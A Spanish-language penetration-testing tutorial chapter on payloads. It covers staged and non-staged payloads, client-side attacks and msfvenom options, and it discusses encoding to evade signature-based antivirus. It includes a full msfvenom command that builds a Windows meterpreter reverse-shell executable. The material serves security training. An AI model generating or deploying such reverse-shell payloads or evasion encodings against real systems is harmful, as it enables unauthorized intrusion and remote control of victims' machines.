# 4. Payloads

Un payload es la carga útil que se ejecuta en un sistema objetivo una vez que una vulnerabilidad ha sido explotada con éxito. Mientras que un exploit se encarga de aprovechar una debilidad de seguridad para obtener acceso o ejecutar código, el payload representa la acción que se llevará a cabo tras dicha explotación.

Pueden distintos objetivos, siendo las más habituales:

- la apertura de una consola remota
- la ejecución de comandos en el sistema comprometido
- la recopilación de información
- la elevación de privilegios o el establecimiento de mecanismos de acceso persistente

Dentro de los ataques dirigidos al cliente (client-side attacks), los payloads suelen distribuirse mediante archivos o aplicaciones aparentemente legítimas que son ejecutadas por el usuario objetivo. Por este motivo debemos conocer técnicas relacionadas con la generación, codificación y empaquetado de payloads, así como los mecanismos empleados por las soluciones de seguridad para detectarlos y bloquearlos.

### Client-side attacks

Son un vector de ataque con el objetivo de conseguir que un usuario interactúe con contenido diseñado para ejecutar acciones controladas por el atacante en el sistema objetivo. Pueden incluir la ejecución de código, la recopilación de información, el acceso remoto al sistema o el establecimiento de comunicaciones con la infraestructura del atacante.

Suelen apoyarse en técnicas de ingeniería social para persuadir al usuario de abrir documentos, ejecutar aplicaciones o visitar recursos aparentemente legítimos. Los formatos más utilizados son: documentos ofimáticos, archivos PDF, instaladores y ejecutables portables. Los ataques del lado del cliente se centran en la interacción del usuario y en las aplicaciones que usa habitualmente.

Debido a que estos ataques suelen requerir la entrega y, en muchos casos, el almacenamiento de un payload en el sistema objetivo, es necesario considerar los mecanismos de detección y protección.

### Tipos de payloads

Los payload pueden ser staged o non-staged.

#### Staged payload

Un staged payload se divide en dos partes:

1. **Stage 1 (stager):** un pequeño código inicial que se ejecuta primero.
2. **Stage 2 (stage):** una vez establecida la conexión, el stager descarga y ejecuta el payload completo.

**Ventajas**

- Tamaño inicial muy pequeño.
- Útil cuando la vulnerabilidad permite inyectar pocos bytes.
- Puede cargar funcionalidades más complejas después.

**Desventajas**

- Requiere una segunda comunicación para descargar la carga completa.
- Más oportunidades para que sistemas de seguridad detecten o bloqueen la actividad.

Normalmente el flujo es:

1. El atacante aprovecha una vulnerabilidad mediante un exploit.
2. El exploit introduce o ejecuta un stager muy pequeño en la máquina víctima.
3. El stager se ejecuta en la víctima.
4. El stager establece comunicación con el atacante (o escucha una conexión, según el tipo de payload).
5. A través de esa conexión se transfiere el stage (la carga completa).
6. La víctima carga y ejecuta ese stage en memoria.

#### Non-staged payload

Contiene todo el código necesario en una sola pieza.

**Ventajas**

- No necesita descargar una segunda etapa.
- Menos dependencia de la red tras la explotación.
- Puede ser más fiable en entornos con filtros o restricciones.

**Desventajas**

- El payload inicial es más grande.
- Puede ser más difícil introducirlo en vulnerabilidades con limitaciones de tamaño.

Normalmente el flujo es:

1. El atacante aprovecha una vulnerabilidad mediante un exploit.
2. Payload completo llega a la víctima.
3. Payload completo se ejecuta.
4. Establece la conexión (si la necesita).
5. Proporciona la funcionalidad.

## 4.1. Generación de payloads con `Msfvenom`

Msfvenom es una herramienta de línea de comandos incluida en Metasploit que permite generar y codificar (encode) payloads para distintos sistemas operativos y plataformas.

Permite generar payloads compatibles con sistemas Windows, Linux, macOS y Android, así como exportarlos en múltiples formatos, incluyendo ejecutables, bibliotecas dinámicas, scripts y otros tipos de archivos

Con `Msfvenom` se pueden payloads que, una vez ejecutados en el sistema objetivo, establecen una comunicación con un listener o handler configurado previamente por el auditor. Esta conexión permite gestionar la sesión obtenida y evaluar el nivel de acceso alcanzado durante la prueba.

Algunas de las opciones más usadas son:

| Opción           | Descripción                                                       |
| ---------------- | ----------------------------------------------------------------- |
| `-p`             | Selecciona el payload que se va a generar.                        |
| `-l payloads`    | Lista los payloads disponibles.                                   |
| `-l formats`     | Lista los formatos de salida disponibles.                         |
| `-f`             | Especifica el formato de salida (exe, elf, raw, python, c, etc.). |
| `-o`             | Guarda la salida en un archivo.                                   |
| `--list-options` | Muestra las opciones requeridas por un payload concreto.          |
| `-a`             | Arquitectura objetivo (x86, x64, etc.).                           |
| `--platform`     | Plataforma objetivo (Windows, Linux, Android, etc.).              |
| `-e`             | Aplica un encoder al payload.                                     |
| `-i`             | Número de iteraciones del encoder.                                |
| `-b`             | Especifica bytes que deben evitarse (*bad characters*).           |
| `-s`             | Tamaño máximo permitido para el payload.                          |
| `-n`             | Añade datos extra (*NOP sled* o espacio adicional).               |

Ejemplo:

```bash
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.1.45 LPORT=1234 -o payload.exe
```

## 4.2. Codificación  de payloads con `Msfvenom`

Dado que este vector de ataque implica la transferencia y el almacenamiento de un payload malicioso en el sistema del cliente, los atacantes deben ser conscientes de la detección por parte de los antivirus (AV). La mayoría de las soluciones antivirus para usuarios finales utilizan detección basada en firmas para identificar archivos o ejecutables maliciosos.

Podemos evadir soluciones antivirus antiguas basadas en firmas mediante la codificación (encoding) de nuestros payloads. La codificación es el proceso de modificar el shellcode del payload con el objetivo de alterar su firma.

El shellcode es una porción de código que normalmente se utiliza como payload durante la explotación de una vulnerabilidad. Originalmente el shellcode era un fragmento de código cuya finalidad era proporcionar a un atacante una consola remota en el sistema objetivo.

Esta técnica dejó de ser tan efectiva porque los antivirus modernos ya no dependen únicamente de firmas estáticas. Hoy en día los productos de seguridad suelen utilizar además:

- **Análisis heurístico:** buscan comportamientos sospechosos.
- **Análisis de comportamiento:** observan qué hace el programa al ejecutarse.
- **Emulación o sandboxing:** ejecutan el archivo en un entorno controlado.
- **Machine Learning:** detectan patrones asociados a malware.
- **EDR (Endpoint Detection and Response):** monitorizan actividades en memoria, procesos, red y sistema de archivos.

Además, muchos encoders clásicos de herramientas como Metasploit se hicieron muy conocidos. Los fabricantes de seguridad acabaron añadiendo firmas para el payload original y el shellcode descodificado.

## 4.3. Inyección de payloads en ejecutables Windows

[⟵ Anterior](03_shells.md) | [Siguiente ⟶](05_windows.md)
